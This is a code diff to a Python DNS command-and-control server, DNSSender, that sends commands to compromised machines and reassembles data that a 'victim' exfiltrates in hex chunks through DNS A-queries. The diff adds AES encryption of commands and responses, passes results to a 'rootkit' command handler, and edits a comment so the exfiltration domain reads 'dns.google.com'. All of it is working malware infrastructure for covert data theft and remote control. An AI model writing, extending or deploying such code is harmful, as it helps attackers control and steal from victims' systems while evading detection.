@@ -1,4 +1,5 @@
 from dnslib import DNSRecord, QTYPE, RR, A, TXT
+from utils.Crypto.CryptoHandler import CryptoHandler
 import threading
 import binascii
 import socketserver
@@ -22,6 +23,8 @@ class DNSSender:
 
         self._server = None
         self._thread = None
+
+        self._crypto = CryptoHandler(cfg.AES_KEY, cfg.AES_IV)
 
     def start(self) -> None:
         """ 
@@ -69,20 +72,23 @@ class DNSSender:
     def send(self, message: str) -> str:
 
         # Push into global queue
-        self.command_queue.append(message)
+        self.command_queue.append(self._crypto.encrypt(message))
 
-        # Poll‐assemble.
-        raw = self.assemble_exfil().strip()
+        # Poll‐assemble-decrypt.
+        raw = self.assemble_exfil()
+        print(f"[DNS] Received raw response: {raw}")
+        raw_decrypted = self._crypto.decrypt(raw)
+        print(f"[DNS] Decrypted response: {raw_decrypted}")
         
         # Update in BigMama
         if self.owner is not None:
             if hasattr(self.owner, "_check_rootkit_command"):
-                self.owner._check_rootkit_command(raw)
+                self.owner._check_rootkit_command(raw_decrypted)
             if hasattr(self.owner, "_update_command_history"):
-                self.owner._update_command_history(raw)
+                self.owner._update_command_history(raw_decrypted)
 
         # Return the raw response
-        return raw
+        return raw_decrypted
     
     def assemble_exfil(self, timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL) -> str:
         """
@@ -107,18 +113,16 @@ class DNSSender:
             time.sleep(poll)
 
         # If we have received all expected chunks, assemble the data
+        data = b""
         if self.expected_chunks is not None and len(self.exfil_buffer) >= self.expected_chunks:
             data = b''.join(self.exfil_buffer[i] for i in range(self.expected_chunks))
-            text = data.decode(errors='ignore')
-        else:
-            text = ""
 
         # Reset buffers
         self.expected_chunks = None
         self.exfil_buffer.clear()
 
         # Return result
-        return text 
+        return data 
     
     def is_running(self) -> bool:
         return self._running
@@ -192,12 +196,14 @@ class DNSSender:
 
             # Victim exfiltrating via A-queries
             if qtype == "A":
-                print(f"[DNS] A-query received for {qname!r}.")
+                # DEBUG
+                # print(f"[DNS] A-query received for {qname!r}.")
+
                 # Isolate the first label of the queried name
                 label = qname.split('.', 1)[0]
 
                 # Each request should normally be formatted with
-                # xx/xx-<data>.<domain> with xx/xx corresponding to 
+                # xx/xx-<data>.dns.google.com with xx/xx corresponding to 
                 # the id of chunk / the total number of chunks (both in hex)
                 if '-' in label and '/' in label:
                     hdr, hx = label.split('-', 1)
@@ -209,6 +215,9 @@ class DNSSender:
 
                         # Decode the hex data chunk back into raw bytes
                         chunk = binascii.unhexlify(hx)
+
+                        # DEBUG
+                        # print(f"[DNS] Received chunk {seq}/{tot} with data: {chunk!r}")
 
                         # Store this chunk in the buffer at index = sequence number
                         sender.exfil_buffer[seq] = chunk
